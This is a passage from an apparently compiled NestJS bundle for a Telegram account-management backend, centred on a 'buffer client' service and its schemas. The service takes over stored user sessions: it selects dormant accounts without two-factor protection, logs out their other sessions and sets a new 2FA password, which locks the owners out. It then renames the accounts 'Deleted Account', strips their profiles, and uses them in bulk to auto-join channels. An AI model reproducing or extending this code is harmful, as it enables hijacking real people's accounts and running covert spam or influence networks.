            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule)
        ],
        controllers: [buffer_client_controller_1.BufferClientController],
        providers: [buffer_client_service_1.BufferClientService],
        exports: [buffer_client_service_1.BufferClientService]
    })
], BufferClientModule);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.service.ts":
/*!****************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.service.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ./../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const promote_client_service_1 = __webpack_require__(/*! ../promote-clients/promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
let BufferClientService = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, promoteClientService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.promoteClientService = promoteClientService;
        this.joinChannelMap = new Map();
    }
    async create(bufferClient) {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }
    async findAll() {
        return this.bufferClientModel.find().exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.bufferClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log("creating");
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);
        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromBufferMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearBufferMap() {
        console.log("BufferMap cleared");
        this.joinChannelMap.clear();
    }
    async joinchannelForBufferClients(skipExisting = true) {
        if (!this.telegramService.getActiveClientSetup()) {
            console.log("Joining Channel Started");
            await this.telegramService.disconnectAll();
            this.clearJoinChannelInterval();
            await (0, Helpers_1.sleep)(2000);
            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
            const clients = await this.bufferClientModel.find({ channels: { "$lt": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);
            if (clients.length > 0) {
                for (const document of clients) {
                    try {
                        const client = await this.telegramService.createClient(document.mobile, false, false);
                        console.log("Started Joining for : ", document.mobile);
                        const channels = await client.channelInfo(true);
                        console.log("Existing Channels Length : ", channels.ids.length);
                        await this.update(document.mobile, { channels: channels.ids.length });
                        let result = [];
                        if (channels.canSendFalseCount < 50) {
                            if (channels.ids.length < 220) {
                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            else {
                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            this.joinChannelMap.set(document.mobile, result);
                            await this.telegramService.deleteClient(document.mobile);
                        }
                        else {
                            client.leaveChannels(channels.canSendFalseChats);
                        }
                    }
                    catch (error) {
                        await this.telegramService.deleteClient(document.mobile);
                        (0, utils_1.parseError)(error);
                    }
                }
                this.joinChannelQueue();
            }
            console.log("Joining Channel Triggered Succesfully for ", clients.length);
            return `Initiated Joining channels ${clients.length}`;
        }
        else {
            console.log("ignored active check buffer channels as active client setup exists");
        }
    }
    async joinChannelQueue() {
        const existingkeys = Array.from(this.joinChannelMap.keys());
        if (existingkeys.length > 0) {
            this.joinChannelIntervalId = setInterval(async () => {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length > 0) {
                    console.log("In JOIN CHANNEL interval: ", new Date().toISOString());
                    for (const mobile of keys) {
                        const channels = this.joinChannelMap.get(mobile);
                        if (channels && channels.length > 0) {
                            const channel = channels.shift();
                            console.log(mobile, " Pending Channels :", channels.length);
                            this.joinChannelMap.set(mobile, channels);
                            try {
                                await this.telegramService.createClient(mobile, false, false);
                                console.log(mobile, " Trying to join :", channel.username);
                                await this.telegramService.tryJoiningChannel(mobile, channel);
                            }
                            catch (error) {
                                await this.telegramService.deleteClient(mobile);
                                const errorDetails = (0, utils_1.parseError)(error, `${mobile} @${channel.username} Outer Err ERR: `);
                                if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {
                                    this.removeFromBufferMap(mobile);
                                    const channels = await this.telegramService.getChannelInfo(mobile, true);
                                }
                            }
                            await this.telegramService.deleteClient(mobile);
                        }
                        else {
                            this.joinChannelMap.delete(mobile);
                        }
                    }
                }
                else {
                    this.clearJoinChannelInterval();
                }
            }, 4 * 60 * 1000);
        }
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            setTimeout(() => {
                this.joinchannelForBufferClients(false);
            }, 30000);
        }
    }
    async setAsBufferClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await this.telegramService.createClient(mobile, false);
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
            await this.telegramService.deleteClient(mobile);
            return "Client set as buffer successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkBufferClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await this.telegramService.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            const bufferclients = await this.findAll();
            let goodIds = [];
            let badIds = [];
            if (bufferclients.length < 70) {
                for (let i = 0; i < 70 - bufferclients.length; i++) {
                    badIds.push(i.toString());
                }
            }
            const clients = await this.clientService.findAll();
            const promoteclients = await this.promoteClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile); })];
            const promoteclientIds = promoteclients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of bufferclients) {
                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {
                    try {
                        const cli = await this.telegramService.createClient(document.mobile, true, false);
                        const me = await cli.getMe();
                        if (me.username) {
                            await this.telegramService.updateUsername(document.mobile, '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        if (me.firstName !== "Deleted Account") {
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        await this.telegramService.deleteProfilePhotos(document.mobile);
                        const hasPassword = await cli.hasPassword();
                        if (!hasPassword) {
                            console.log("Client does not have password");
                            badIds.push(document.mobile);
                        }
                        else {
                            console.log(document.mobile, " :  ALL Good");
                            goodIds.push(document.mobile);
                        }
                        await this.telegramService.deleteClient(document.mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (error) {
                        (0, utils_1.parseError)(error);
                        badIds.push(document.mobile);
                        this.remove(document.mobile);
                        await this.telegramService.deleteClient(document.mobile);
                    }
                }
                else {
                    console.log("Number is a Active Client");
                    goodIds.push(document.mobile);
                    this.remove(document.mobile);
                }
            }
            goodIds = [...goodIds, ...clientIds, ...promoteclientIds];
            console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
            this.addNewUserstoBufferClients(badIds, goodIds);
        }
        else {
            console.log("ignored active check buffer channels as active client setup exists");
        }
    }
    async addNewUserstoBufferClients(badIds, goodIds) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);
        console.log("New buffer documents to be added: ", documents.length);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile, false);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        await (0, Helpers_1.sleep)(2000);
                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);
                        console.log("Inserting Document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        };
                        await this.create(bufferClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        console.log("=============Created BufferClient=============");
                        await this.telegramService.deleteClient(document.mobile);
                        badIds.pop();
                    }
                    else {
                        console.log("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                        await this.telegramService.deleteClient(document.mobile);
                    }
                }
                catch (error) {
                    (0, utils_1.parseError)(error);
                    await this.telegramService.deleteClient(document.mobile);
                }
            }
            catch (error) {
                (0, utils_1.parseError)(error);
                console.error("An error occurred:", error);
            }
            await this.telegramService.deleteClient(document.mobile);
        }
        setTimeout(() => {
            this.joinchannelForBufferClients();
        }, 2 * 60 * 1000);
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        promote_client_service_1.PromoteClientService])
], BufferClientService);


/***/ }),

/***/ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/create-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateBufferClientDto {
}
exports.CreateBufferClientDto = CreateBufferClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Session identifier',
        example: 'session123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/search-buffer- client.dto.ts":
/*!************************************************************************!*\
  !*** ./src/components/buffer-clients/dto/search-buffer- client.dto.ts ***!
  \************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchBufferClientDto {
}
exports.SearchBufferClientDto = SearchBufferClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'availableDate of the bufferClient',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Session identifier',
        example: 'session123',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/update-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
class UpdateBufferClientDto extends (0, swagger_1.PartialType)(create_buffer_client_dto_1.CreateBufferClientDto) {
}
exports.UpdateBufferClientDto = UpdateBufferClientDto;


/***/ }),

/***/ "./src/components/buffer-clients/schemas/buffer-client.schema.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/schemas/buffer-client.schema.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientSchema = exports.BufferClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let BufferClient = class BufferClient {
};
exports.BufferClient = BufferClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "session", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], BufferClient.prototype, "channels", void 0);
exports.BufferClient = BufferClient = __decorate([
    (0, mongoose_1.Schema)({ collection: 'bufferClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], BufferClient);
exports.BufferClientSchema = mongoose_1.SchemaFactory.createForClass(BufferClient);


/***/ }),

/***/ "./src/components/builds/build.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/builds/build.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
let BuildController = class BuildController {
    constructor(buildService) {
        this.buildService = buildService;
    }
    async findOne() {
        return this.buildService.findOne();
    }
    async update(updateClientDto) {
        return this.buildService.update(updateClientDto);
    }
};
exports.BuildController = BuildController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get build data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update build' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "update", null);
exports.BuildController = BuildController = __decorate([
    (0, swagger_1.ApiTags)('Build'),
    (0, common_1.Controller)('builds'),
    __metadata("design:paramtypes", [build_service_1.BuildService])
], BuildController);


/***/ }),

/***/ "./src/components/builds/build.module.ts":
/*!***********************************************!*\
  !*** ./src/components/builds/build.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
const build_controller_1 = __webpack_require__(/*! ./build.controller */ "./src/components/builds/build.controller.ts");
const builds_schema_1 = __webpack_require__(/*! ./builds.schema */ "./src/components/builds/builds.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
let BuildModule = class BuildModule {
};
exports.BuildModule = BuildModule;
exports.BuildModule = BuildModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            BuildModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: builds_schema_1.BuildSchema }]),
            npoint_module_1.NpointModule,
        ],
        providers: [build_service_1.BuildService],
        controllers: [build_controller_1.BuildController],
        exports: [BuildModule],
    })
], BuildModule);


/***/ }),

/***/ "./src/components/builds/build.service.ts":
/*!************************************************!*\
  !*** ./src/components/builds/build.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let BuildService = class BuildService {
    constructor(buildModel, npointSerive) {
        this.buildModel = buildModel;
        this.npointSerive = npointSerive;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = await this.buildModel.findOne({}).exec();
        if (!user) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.buildModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        try {
            await this.npointSerive.updateDocument("3375d15db1eece560188", updatedUser);
            console.log("Updated document successfully in npoint");
        }
        catch (error) {
            console.log(error);
        }
        if (!updatedUser) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return updatedUser;
    }
};
exports.BuildService = BuildService;
exports.BuildService = BuildService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('buildModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], BuildService);


/***/ }),

/***/ "./src/components/builds/builds.schema.ts":
/*!************************************************!*\
  !*** ./src/components/builds/builds.schema.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildSchema = exports.Build = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
